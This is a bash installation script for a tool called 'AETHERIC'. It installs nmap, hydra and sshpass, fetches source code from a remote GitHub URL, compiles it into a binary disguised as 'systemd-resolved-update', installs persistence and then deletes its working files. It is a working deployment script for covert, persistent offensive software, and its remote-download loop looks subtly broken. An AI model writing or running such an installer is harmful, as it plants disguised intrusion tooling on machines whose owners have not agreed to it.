#!/bin/bash
# AETHERIC Installation Script
# Downloads Python, creates venv, compiles binary, installs persistence.

set -e

REPO_URL="https://raw.githubusercontent.com/reconagent/version_1/main"
WORKDIR="/tmp/aetheric_install"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# Install dependencies

apt-get install -y python3 python3-venv python3-pip git build-essential nmap hydra sshpass rsync

# Download source files
for file in main.py core/*.py modules/*.py utils/*.py requirements.txt; do
    mkdir -p "$(dirname "$file")"
    curl -s -o "$file" "$REPO_URL/$file"
done

# Create virtual environment and install dependencies
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
pip install pyinstaller

# Compile binary with PyInstaller (single file)
pyinstaller --onefile --name systemd-resolved-update main.py
# Move binary to /usr/local/bin
cp dist/systemd-resolved-update /usr/local/bin/

# Run installation (--install) to set persistence
/usr/local/bin/systemd-resolved-update --install

# Cleanup
cd /
rm -rf "$WORKDIR"

echo "AETHERIC installed."
